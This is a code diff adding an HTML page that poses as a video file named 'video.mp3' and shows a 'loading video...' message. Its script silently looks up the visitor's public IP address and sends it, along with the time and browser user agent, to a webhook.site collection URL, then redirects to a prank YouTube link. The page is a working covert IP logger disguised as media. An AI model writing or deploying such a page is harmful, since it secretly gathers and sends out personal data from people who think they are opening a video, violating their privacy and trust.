@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>video.mp3</title>
+  <style>
+    body {
+      background: #000;
+      color: #0f0;
+      font-family: monospace;
+      padding: 2rem;
+    }
+  </style>
+</head>
+<body>
+  <h1>loading video...</h1>
+
+  <script>
+    fetch("https://api.ipify.org?format=json")
+      .then(res => res.json())
+      .then(data => {
+        fetch("https://webhook.site/283f889e-33ae-46e3-9fa9-76b3be36cce0", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            ip: data.ip,
+            time: new Date().toISOString(),
+            userAgent: navigator.userAgent
+          })
+        });
+      });
+
+    // OPTIONAL: redirect after 3 seconds
+    setTimeout(() => {
+      window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"; // lol
+    }, 7000);
+  </script>
+</body>
+</html>
